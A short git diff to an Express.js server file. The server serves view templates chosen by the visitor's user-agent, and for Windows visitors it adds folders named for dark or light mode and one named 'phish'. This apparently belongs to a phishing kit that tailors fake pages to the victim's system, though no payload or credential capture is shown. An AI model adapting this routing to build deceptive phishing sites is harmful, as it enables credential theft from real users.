@@ -6,19 +6,26 @@ var logger = require('morgan');
 var useragent = require('useragent');
 
 var indexRouter = require('./routes/index');
-var usersRouter = require('./routes/users');
+var usersRouter = require('./routes/pages');
 
 var app = express();
 
 // view engine setup
 app.use('/', (req, res, next) => {
 
-  ua = useragent.parse(req.headers['user-agent'])// true
+  ua = useragent.parse(req.headers['user-agent']) // true
  // console.log(ua.os)
-  if (ua.os.family==='Windows')
+  if (ua.os.family === 'Windows')
   {
     console.log(ua.os)
-    app.set('views', path.join(__dirname, 'views/Windows-DarkMode-Delay'));
+    app.set('views', [ 
+
+      path.join(__dirname, 'views/Windows-DarkMode-Delay'),
+      path.join(__dirname, 'views/Windows-Chrome-DarkMode'),
+      path.join(__dirname, 'views/phish'), 
+      path.join(__dirname, 'views/Windows-Chrome-LightMode')
+      
+      ]);
   }
   else {
     app.set('views', path.join(__dirname, 'views/Windows-DarkMode-Delay'));
@@ -36,10 +43,10 @@ app.use(logger('dev'));
 app.use(express.json());
 app.use(express.urlencoded({ extended: false }));
 app.use(cookieParser());
-app.use(express.static(path.join(__dirname, 'public/Windows-DarkMode-Delay')));
+app.use(express.static(path.join(__dirname, 'public/')));
 
 app.use('/', indexRouter);
-app.use('/users', usersRouter);
+app.use('/page', usersRouter);
 
 // catch 404 and forward to error handler
 app.use(function(req, res, next) {
